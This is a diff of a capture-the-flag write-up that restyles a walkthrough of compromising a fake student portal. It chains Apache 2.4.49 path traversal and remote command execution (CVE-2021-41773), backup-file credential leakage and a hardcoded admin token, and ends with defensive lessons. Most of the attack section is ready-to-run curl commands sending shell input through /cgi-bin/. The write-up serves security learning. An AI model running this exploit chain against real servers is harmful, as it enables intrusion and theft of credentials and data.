@@ -1,24 +1,38 @@
 # L'Enigme du Code Apogee
 
-## Challenge Information
+![Category](https://img.shields.io/badge/Category-Web%20Exploitation-2563eb?style=flat-square)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium%20%2F%20Hard-f59e0b?style=flat-square)
+![CVE](https://img.shields.io/badge/CVE-2021--41773-dc2626?style=flat-square)
+![Impact](https://img.shields.io/badge/Impact-RCE%20%2B%20Secret%20Leak-7c3aed?style=flat-square)
 
-| Field | Value |
-| --- | --- |
-| Category | Web Exploitation |
-| Difficulty | Medium / Hard |
+> Objective: compromise a fake ENSA Beni Mellal portal by chaining Apache path traversal, RCE, backup leakage and hidden admin export access.
 
-The challenge presented a fake ENSA Beni Mellal student portal.
+## Executive Summary
 
-## Reconnaissance
+The target exposed an Apache `2.4.49` server, immediately suggesting CVE-2021-41773. The vulnerable `/cgi-bin/` path allowed traversal and remote command execution through `/bin/sh`.
 
-Directory fuzzing revealed interesting endpoints:
+After gaining RCE as `www-data`, I enumerated `/var/www/html`, found a leaked `backup/config.bak`, recovered credentials and a hidden admin export token, then accessed the protected export endpoint to obtain the flag.
+
+## Attack Chain
+
+| Phase | Technique | Result |
+| --- | --- | --- |
+| Recon | Directory fuzzing | `admin`, `backup`, `cgi-bin` found |
+| Fingerprint | Server banner review | Apache `2.4.49` identified |
+| Exploit | CVE-2021-41773 | Path traversal confirmed |
+| RCE | `/bin/sh` through `cgi-bin` | Command execution as `www-data` |
+| Post-exploitation | Web root enumeration | `backup/config.bak` found |
+| Secret discovery | Grep source files | `jury2026` token found |
+| Flag access | Hidden export endpoint | Flag disclosed |
+
+## 1. Reconnaissance
 
 ```bash
 ffuf -u https://csia-ctf26-ensa-web-challenge.chals.io/FUZZ \
   -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Interesting results:
+Interesting paths:
 
 ```text
 admin                   [Status: 301]
@@ -26,24 +40,24 @@ backup                  [Status: 301]
 cgi-bin/                [Status: 403]
 ```
 
-The most important clue was the server banner:
+Critical fingerprint:
 
 ```text
 Apache/2.4.49 (Unix)
 ```
 
-This version is known for the Apache path traversal vulnerability CVE-2021-41773.
+This version is associated with Apache path traversal vulnerability CVE-2021-41773.
 
-## Exploiting Apache 2.4.49
+## 2. Path Traversal and RCE
 
-I tested path traversal through `/cgi-bin/`:
+Traversal test:
 
 ```bash
 curl -s --path-as-is \
   "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
 ```
 
-Then I confirmed remote code execution through `/bin/sh`:
+RCE test:
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -59,9 +73,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 RCE was confirmed.
 
-## Enumerating the Web Directory
-
-I listed the web root:
+## 3. Web Root Enumeration
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -80,11 +92,9 @@ index.php
 robots.txt
 ```
 
-The `backup/` directory looked suspicious.
+The `backup/` folder was the next strong lead.
 
-## Backup Leakage
-
-I listed the backup directory:
+## 4. Backup Leakage
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -98,7 +108,7 @@ Output:
 config.bak
 ```
 
-Then I read the file:
+Read the backup:
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -106,7 +116,7 @@ curl -s --path-as-is -X POST \
   -d "echo;cat /var/www/html/backup/config.bak"
 ```
 
-Interesting content:
+Leaked content:
 
 ```text
 DB_USER=etudiant
@@ -115,34 +125,32 @@ DB_PASS=123456
 JURY_TOKEN_HASH=5e1ed8b7f3abcb9db4c1fd18fe17b5a1
 ```
 
-The backup also contained a Base64 clue:
+Base64 hint:
 
 ```text
 # ZXR1ZGlhbnQ6MTIzNDU2
 # base64 : etudiant:123456
 ```
 
-## Valid Credentials
-
-I tested the leaked credentials:
+## 5. Credential Validation
 
 ```bash
 curl -i -X POST https://csia-ctf26-ensa-web-challenge.chals.io/ \
   -d "username=etudiant&password=123456"
 ```
 
-The response showed a valid session:
+Successful session:
 
 ```text
 HTTP/1.1 302 Found
 Set-Cookie: PHPSESSID=...
 ```
 
-The account worked, but it had limited privileges.
+The account was valid but had limited privileges.
 
-## Hidden Admin Export
+## 6. Hidden Admin Export
 
-I enumerated the admin directory:
+List admin directory:
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -156,7 +164,7 @@ Output:
 export
 ```
 
-I searched for token references inside the web directory:
+Search for token references:
 
 ```bash
 curl -s --path-as-is -X POST \
@@ -164,21 +172,19 @@ curl -s --path-as-is -X POST \
   "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
 ```
 
-Output:
+Result:
 
 ```php
 /var/www/html/admin/export/grades.php:$secret_token = 'jury2026';
 ```
 
-This revealed the token protecting the export.
-
-## Accessing the Protected Export
+## 7. Flag Retrieval
 
 ```bash
 curl "https://csia-ctf26-ensa-web-challenge.chals.io/admin/export/grades.php?token=jury2026"
 ```
 
-The page revealed:
+Response:
 
 ```text
 FLAG=CSIA{G00d_LuCk_4t_3NSA_BM_2026}
@@ -190,21 +196,13 @@ FLAG=CSIA{G00d_LuCk_4t_3NSA_BM_2026}
 CSIA{G00d_LuCk_4t_3NSA_BM_2026}
 ```
 
-## Key Takeaways
+## Lessons Learned
 
-- Apache 2.4.49 path traversal and RCE are highly impactful.
-- Backup files can leak credentials, hashes, and operational secrets.
-- Post-exploitation enumeration is often the difference between shell access and flag recovery.
-- Hidden admin functionality should never rely on a hardcoded token.
-
-## Attack Chain
-
-1. Fuzz directories.
-2. Identify Apache 2.4.49.
-3. Exploit CVE-2021-41773.
-4. Confirm RCE.
-5. Enumerate `/var/www/html`.
-6. Read `backup/config.bak`.
-7. Find hidden admin export token.
-8. Access the export and recover the flag.
+| Finding | Security lesson |
+| --- | --- |
+| Apache `2.4.49` exposed | Patch known vulnerable services quickly |
+| `/cgi-bin/` allowed traversal | Harden path normalization and CGI exposure |
+| Backup file in web root | Never deploy `.bak` secrets publicly |
+| Hardcoded export token | Avoid static tokens and hidden security by obscurity |
+| RCE as `www-data` | Least privilege and isolation matter |
 
